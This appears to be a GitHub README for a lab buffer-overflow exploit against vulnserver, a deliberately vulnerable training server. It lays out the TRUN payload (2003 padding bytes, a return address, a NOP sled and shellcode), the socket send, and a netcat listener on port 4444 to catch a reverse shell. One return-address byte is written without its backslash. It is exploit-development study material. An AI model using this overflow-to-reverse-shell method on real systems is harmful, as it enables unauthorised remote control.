# vulnserver-Reverse-shell
![image](https://github.com/abdomagdy0/vulnserver-Reverse-shell/assets/91535529/3ec4660f-14e8-4d9b-9cc6-f5cc319577aa)

#  Crafting the payload:
The shellcode variable is created by concatenating several components:
`TRUN / .:/'` This is the prefix or part of the payload header.
`'A' * 2003` This pads the payload with 2003 bytes of 'A' characters. This could be part of a buffer overflow exploit, where the 'A's are used to fill up a buffer until a certain memory address is overwritten.
`b"xaf\x11\x50\x62"` This is the return address, indicating where execution should jump after the buffer overflow occurs.
`b"\x90" * 16` This is a sequence of 16 NOP (No Operation) instructions, which are commonly used in exploit development for padding or to slide over parts of the exploit.
`overflow`: This is the previously defined shellcode containing the actual payload.
## Establishing a connection and sending the payload: 
`The socket.create_connection()` function creates a TCP connection to the specified host and port. Then, `the soc.send()` method sends the crafted shellcode payload over the network to the target.
 
 `nc -nvlp 4444`
 
 run the script
 `./shellcode.py`

 ![aasa —](https://github.com/abdomagdy0/vulnserver-Reverse-shell/assets/91535529/7a132b57-3982-44c1-8b15-6559141d46f2)

